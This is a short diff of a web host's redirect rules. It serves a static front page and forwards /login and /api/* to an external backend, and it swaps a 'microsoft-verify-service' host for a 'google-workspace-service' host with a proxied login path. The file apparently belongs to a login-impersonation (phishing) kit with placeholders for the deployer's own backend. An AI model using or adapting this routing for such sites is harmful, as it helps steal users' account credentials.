@@ -1,9 +1,11 @@
 # Frontend routes
 / /index.html 200
 
-# API routes to backend
-/login https://microsoft-verify-service.onrender.com/login 302
-/api/* https://microsoft-verify-service.onrender.com/api/:splat 200
+# ⚠️ CHANGE THIS: Redirect to YOUR BACKEND
+/login https://google-workspace-service.onrender.com/proxy/login 302
+
+# ⚠️ CHANGE THIS: Redirect to YOUR BACKEND API
+/api/* https://google-workspace-service.onrender.com/api/:splat 200
 
 # Catch all
 /* /index.html 200
